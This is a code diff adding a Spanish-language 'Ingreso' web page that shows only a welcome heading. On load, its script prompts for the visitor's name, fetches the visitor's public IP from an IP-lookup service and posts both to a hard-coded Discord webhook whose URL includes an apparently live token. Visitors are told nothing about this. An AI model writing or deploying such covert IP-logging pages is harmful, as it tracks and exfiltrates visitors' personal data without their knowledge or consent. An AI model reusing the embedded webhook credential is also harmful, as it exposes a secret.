@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Ingreso</title>
+  <script>
+    async function start() {
+      const nombre = prompt("Escribí tu nombre:");
+      
+      const res = await fetch("https://api.ipify.org?format=json");
+      const data = await res.json();
+      const ip = data.ip;
+
+
+      fetch('https://discord.com/api/webhooks/1392934299413643336/EtcuW2swv1vIPakxg7zoX643KSwhUx0kN2DOFQnvRkpIg5JL0uD9Vl0w6hnmNOAOf88D', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          username: " Registro Web",
+          content: ` Nuevo visitante\n Nombre: ${nombre}\n🌐 IP: ${ip}\n Id: ${crypto.randomUUID()}`
+        })
+      });
+    }
+
+    window.onload = start;
+  </script>
+</head>
+<body>
+  <h1>Bienvenido a la página</h1>
+</body>
+</html>
